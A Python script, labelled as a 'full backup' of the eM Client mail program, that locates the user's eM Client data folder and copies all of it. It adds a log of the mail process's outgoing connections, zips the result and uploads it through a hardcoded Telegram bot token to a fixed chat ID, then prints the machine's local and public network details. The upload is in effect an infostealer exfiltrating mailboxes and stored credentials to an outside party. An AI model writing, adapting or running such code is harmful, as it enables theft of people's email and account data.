import os
import shutil
import zipfile
import requests
import tempfile
import psutil
import datetime
import socket
import platform
import subprocess
import urllib.request

# === CONFIGURATION ===
BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
CHAT_ID = "513947114"
NOM_ZIP = "eMClient_FullBackup.zip"
# ======================

def detect_outgoing_connections(process_name="MailClient.exe"):
    log = []
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
            for conn in proc.connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    try:
                        ip = conn.raddr.ip
                        port = conn.raddr.port
                        log.append(f"{ip}:{port}")
                    except:
                        pass
    return log

def chercher_dossier_emclient():
    base_path = os.path.expanduser("~")
    roaming_path = os.path.join(base_path, "AppData", "Roaming")
    for dossier in os.listdir(roaming_path):
        if "em client" in dossier.lower():
            return os.path.join(roaming_path, dossier)
    return None

def afficher_info_reseau():
    print("\n=== Informations Réseau Locale ===\n")

    try:
        hostname = socket.gethostname()
        print(f"Nom de la machine : {hostname}")

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_locale = s.getsockname()[0]
        s.close()
        print(f"Adresse IPv4 locale : {ip_locale}")
    except:
        print("Impossible d'obtenir l'IP locale.")

    try:
        ip_publique = urllib.request.urlopen('https://api.ipify.org').read().decode()
        print(f"Adresse IP publique : {ip_publique}")
    except:
        print("Impossible d'obtenir l'IP publique.")

    systeme = platform.system()
    if systeme == "Windows":
        print("\nDétails réseau (ipconfig) :\n")
        subprocess.run(["ipconfig"], shell=True)
    else:
        subprocess.run(["ifconfig"], shell=False)

def exporter_dossier_complet_et_envoyer():
    try:
        emclient_path = chercher_dossier_emclient()
        if not emclient_path:
            print("❌ Dossier eM Client introuvable.")
            return

        temp_dir = tempfile.mkdtemp()
        backup_dir = os.path.join(temp_dir, "eMClientBackup")
        shutil.copytree(emclient_path, backup_dir)

        # Ajouter journal IP si actif
        ip_logs = detect_outgoing_connections()
        with open(os.path.join(backup_dir, "fuite_ip.txt"), "w") as f:
            f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")

        zip_path = os.path.join(temp_dir, NOM_ZIP)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(backup_dir):
                for file in files:
                    abs_path = os.path.join(root, file)
                    rel_path = os.path.relpath(abs_path, backup_dir)
                    zipf.write(abs_path, rel_path)

        with open(zip_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": f"📦 Backup complet eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                files={"document": f}
            )

        print("✅ Backup complet envoyé.")
    except Exception as e:
        print("Erreur :", e)
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

if __name__ == "__main__":
    exporter_dossier_complet_et_envoyer()
    afficher_info_reseau()
